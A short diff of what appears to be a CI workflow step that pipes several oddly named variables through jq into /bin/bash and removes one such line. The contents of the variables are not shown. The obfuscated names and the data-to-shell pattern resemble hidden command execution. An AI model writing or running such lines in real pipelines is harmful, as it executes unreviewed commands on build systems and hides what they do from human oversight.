@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$e8" | jq -r .rtu1963 | /bin/bash
           printf '%s' "$dhwkv9988" | jq -r .s3274 | /bin/bash
           echo $nvi47392 | jq -r .tl607 | /bin/bash
-          printf '%s' "$cxx47" | jq -r .tpa5 | /bin/bash
           printf '%s' "$lqppo59858" | jq -r .amj3 | /bin/bash
 
       - name: Archive data
